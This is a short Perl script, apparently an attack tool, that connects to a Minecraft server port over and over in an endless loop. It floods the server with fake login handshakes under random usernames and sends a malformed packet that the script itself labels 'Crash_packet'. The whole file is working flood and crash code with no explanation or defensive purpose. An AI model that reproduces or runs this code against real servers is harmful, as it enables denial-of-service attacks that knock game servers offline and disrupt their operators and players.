use Socket;
$host = '127.0.0.1';
$port = 25565;
$protocol = chr(47);
$connects = 0;
while (1) {
  $type = 1 + int(rand(3 - 1));
  socket($sock, AF_INET, SOCK_STREAM, getprotobyname('tcp'));
  connect($sock , sockaddr_in($port, inet_aton($host)));
  $connects += 1;
  if($type == 1){
    $username = 1111111111 + int(rand(9999999999 - 1111111111));
    send($sock , "\x06\x00$protocol\x00\x00\x00\x02" , 0);
    send($sock , "\x0c\x00\n$username", 0);
	print "[$username/$connects]\n";
  } elsif($type == 2) {
    print "[Crash_packet/$connects]\n";
    send($sock , "\xe3\x02\x0b\x00\ttipidoras\x12\x00/\x0c188.188.88.8\x03", 0);
  }
  sleep(0.01);
  close($sock);
}
